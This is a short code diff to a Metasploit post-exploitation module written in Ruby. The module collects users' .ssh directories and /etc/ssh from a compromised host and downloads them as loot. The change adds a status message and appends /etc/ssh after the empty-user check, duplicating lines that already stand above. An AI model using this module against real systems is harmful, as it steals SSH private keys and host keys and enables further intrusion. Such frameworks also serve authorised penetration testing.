@@ -39,6 +39,7 @@ class Metasploit3 < Msf::Post
 		paths = enum_user_directories.map {|d| d + "/.ssh"}
 
 		# Grab the contents of /etc/ssh as well. A host key is fine too.
+		print_status("Adding /etc/ssh to list of directories to loot")
 		paths.push('/etc/ssh')
 	
 		# Array#select! is only in 1.9
@@ -48,6 +49,10 @@ class Metasploit3 < Msf::Post
 			print_error("No users found with a .ssh directory")
 			return
 		end
+		
+		# Grab the contents of /etc/ssh as well. A host key is fine too.
+		print_status("Adding /etc/ssh to list of directories to loot")
+		paths.push('/etc/ssh')
 
 		download_loot(paths)
 	end
